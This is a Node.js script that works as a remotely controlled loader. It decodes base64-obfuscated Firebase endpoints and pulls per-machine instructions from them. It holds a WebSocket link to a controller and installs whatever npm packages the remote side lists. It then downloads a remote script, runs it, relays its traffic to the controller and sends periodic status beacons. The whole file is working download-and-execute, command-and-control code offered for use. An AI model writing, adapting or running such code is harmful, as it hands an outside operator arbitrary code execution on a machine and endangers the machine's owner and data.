const { execSync, fork } = require('child_process')
const crypto = require('crypto')
const WebSocket = require('ws')
const fs = require('fs')


let mCmd = null
let mScript = null
let CONNECTION = null
let reconnecting = false
let finishStatus = false
let USER = getUserName()
let FINISH = new Date().getTime()+21000000

let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')


startServer()

setInterval(() => {
    try {
        if (CONNECTION && CONNECTION.readyState === WebSocket.OPEN) {
            CONNECTION.ping()
        }
    } catch (error) {}
}, 60000)

setInterval(async () => {
    await checkStatus(false)
}, 300000)


async function startServer() {
    console.log('Node: ---START-SERVER---')

    let module = await onModuleDetails()
    if (!module) {
        console.log('---PROCESS-CLOSE---')
        process.exit(0)
    }

    await checkStatus(true)
    
    await runDynamicServer(module)
}

async function onModuleDetails() {
    try {
        let data = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L3J1bm5pbmcv')+USER+'.json')

        if (data && data.module) {
            let database = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L2RhdGFiYXNlLw==')+data.database+'.json')
            
            if (database) {
                await runWebSocket(database)
                console.log('Node: ---SOCKET-CONNECTION-SUCCESS---')
            }

            let module = await getAxios(decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91L21vZHVsZS8=')+data.module+'.json')
            
            if (module) {
                return module
            }
        }
    } catch (error) {}

    return null
}

async function runWebSocket(url) {

    let ws = new WebSocket(url, {
        headers: {
            'x-client-id': USER
        }
    })

    ws.on('open', () => {
        ws.send(JSON.stringify({ t: 2, s: 'controller', d: { s:0, i:USER } }))
        ws.send(JSON.stringify({ t: 3, s: 'controller', d: { s:1, t: Date.now(), i:USER } }))
        ws.send(JSON.stringify({ t: 1, s: USER }))
        reconnecting = false
        CONNECTION = ws
    })

    ws.on('message', (data, isBinary) => {
        try {
            if (!isBinary) {
                let json = JSON.parse(data.toString())
                if (json.t === 6) {
                    finishStatus = true
                } else {
                    if (mScript) {
                        mScript.send(json)
                    } else {
                        mCmd = json
                    }
                }
            }
        } catch (err) {}
    })

    ws.on('close', () => {
        CONNECTION = null
        if (!reconnecting) {
            reconnecting = true
            setTimeout(() => runWebSocket(url), 3000)
        }
    })

    ws.on('error', err => {
        CONNECTION = null
        if (!reconnecting) {
            reconnecting = true
            ws.close()
        }
    })

    for (let i = 0; i < 30; i++) {
        if (CONNECTION) {
            break
        }
        await delay(1000)
    }
}

function sendWSMessage(connection, data) {
    try {
        if (connection && connection.readyState === WebSocket.OPEN) {
            connection.send(data)
            return true
        }
    } catch (error) {}

    return false
}

async function checkStatus(firstTime) {
    if (FINISH > 0 && FINISH < new Date().getTime()) {
        await closeProcess()
    } else {
        if (!firstTime) sendWSMessage(CONNECTION, JSON.stringify({ t: 3, s: 'controller', d: { s:1, t: Date.now(), i:USER } }))

        if (FINISH > 0 && FINISH < new Date().getTime()) {
            await closeProcess()
        } else {
            try {
                await postAxios(STORAGE+encodeURIComponent('realtime/'+USER+'.json'), '', {
                    'Content-Type':'1/'+Date.now()
                })
            } catch (error) {}
        }
    }
}

async function closeProcess() {
    try {
        await postAxios(STORAGE+encodeURIComponent('realtime/'+USER+'.json'), '', {
            'Content-Type':'0/'+Date.now()
        })
    } catch (error) {}

    try {
        if (CONNECTION) {
            await sendFinishData()
            CONNECTION.close()
            CONNECTION = null
        }
    } catch (error) {}

    console.log('---COMPLETED---')
    process.exit(0)
}

async function sendFinishData() {
    finishStatus = false
    if (sendWSMessage(CONNECTION, JSON.stringify({ t: 6, s: 'controller', d: { s:0, t: Date.now(), i:USER } }))) {
        for (let i = 0; i < 10; i++) {
            await delay(100)
            if (finishStatus) {
                break
            }
        }
    }
}

async function runDynamicServer(data) {
    try {
        let packages = data.install.split(' ')
        let missingPackages = []

        for (let pkg of packages) {
            try {
                require.resolve(pkg)
            } catch {
                missingPackages.push(pkg)
            }
        }

        if (missingPackages.length > 0) {
            console.log('Node: ---INSTALLING-PACKAGE---')
            execSync(`npm install ${missingPackages.join(" ")}`)
            console.log('Node: ---INSTALLATION-SUCCESS---')
        }

        let fileExists = fs.existsSync('script.js')

        if (!fileExists) {
            console.log('Node: ---DOWNLOADING-SCRIPT---')
            let script = await getAxios(data.script)

            if (script) {
                fs.writeFileSync('script.js', script, 'utf8')
                console.log('Node: ---SCRIPT-DOWNLOAD-COMPLETE---')
            } else {
                console.log('Node: ---SCRIPT-DOWNLOAD-FAILED---')
            }
        } else {
            console.log('Node: ---SCRIPT-FOUND---')
        }

        console.log('Node: ---RUNNING-SCRIPT---')
        
        let args = process.argv.slice(2)

        mScript = fork('./script.js', [USER, ...args])

        if (mCmd) {
            mScript.send(mCmd)
        }

        mScript.on('message', (data) => {
            if (typeof data === 'string') {
                sendWSMessage(CONNECTION, data)
            } else {
                sendWSMessage(CONNECTION, JSON.stringify(data))
            }
        })

        mScript.on('exit', () => {
            console.log('Node: ---SCRIPT-CLOSE---')
            
            try {
                mScript.disconnect()
            } catch {}
        })
    } catch (error) {
        console.log('Node: ---SCRIPT-RUNNING-ERROR---')
    }
}


async function getAxios(url, options = {}) {
    try {
        const response = await fetch(url, options)
        if (!response.ok) return null

        const contentType = response.headers.get('content-type')
        if (contentType && contentType.includes('application/json')) {
            return await response.json()
        } else {
            return await response.text()
        }
    } catch (err) {
        return null
    }
}

async function postAxios(url, body, data) {
    try {
        await fetch(url, {
            method: 'POST',
            headers: data,
            body: body
        })
    } catch (error) {}
}


function getUserName() {
    try {
        let directory = __dirname.split('\\')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    try {
        let directory = __dirname.split('/')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    return null
}

function randomWebSocketKey() {
    let arr = []
    for (let i = 0; i < 16; i++) {
        arr.push(Math.floor(Math.random() * 256))
    }
    let binary = String.fromCharCode(...arr)
    return Buffer.from(binary, 'binary').toString('base64')
}


function decode(data) {
    return Buffer.from(data, 'base64').toString('utf-8')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
